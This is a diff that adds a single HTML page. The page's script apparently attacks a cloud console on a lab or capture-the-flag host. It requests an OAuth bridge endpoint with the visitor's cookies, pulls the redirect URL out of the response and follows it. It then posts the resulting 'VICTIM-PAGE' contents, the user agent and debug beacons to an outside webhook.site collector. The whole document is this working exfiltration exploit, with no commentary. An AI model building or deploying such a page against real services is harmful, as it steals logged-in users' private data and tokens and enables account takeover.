@@ -1,0 +1,22 @@
+<!doctype html><html><body><h1>loading...</h1>
+<script>
+var C='https://webhook.site/e2800127-7671-4b5d-a058-6a5ed1f0d9ec';
+function ping(tag,d){try{var x=new XMLHttpRequest();x.open('POST',C,true);x.setRequestHeader('Content-Type','text/plain');x.send(tag+'|'+JSON.stringify(d||{})+'|'+location.href);}catch(e){try{fetch(C,{method:'POST',mode:'no-cors',body:tag+'-fb|'+String(e)})}catch(e2){}}}
+ping('JS-EXEC',{ua:navigator.userAgent});
+(function(){
+ var HST='https://cloud-console-b0f96c6dbcec.pwnbox-lab.com';
+ fetch(HST+'/oauth/bridge?state='+encodeURIComponent('{\"target_host\":\"clf-b0f96c6dbcec.pwnbox-lab.com\",\"return_to\":\"/\"}'),{credentials:'include'})
+ .then(function(r){return r.text()})
+ .then(function(t){
+   ping('BRIDGE-HTML',{head:t.slice(0,400)});
+   var m=t.match(/window\.location\s*=\s*"([^"]+)"/);
+   if(!m){ping('NO-MATCH');return null;}
+   var url=m[1].replace('" + "','');
+   ping('NAVIGATING',{url:url.slice(0,120)});
+   return fetch(url,{credentials:'omit'}).then(function(r){return r.text()}).then(function(page){
+     ping('VICTIM-PAGE',{page:page.slice(0,5000)});
+   });
+ })
+ .catch(function(e){ping('CHAIN-ERR',{e:String(e)})});
+})();
+</script></body></html>
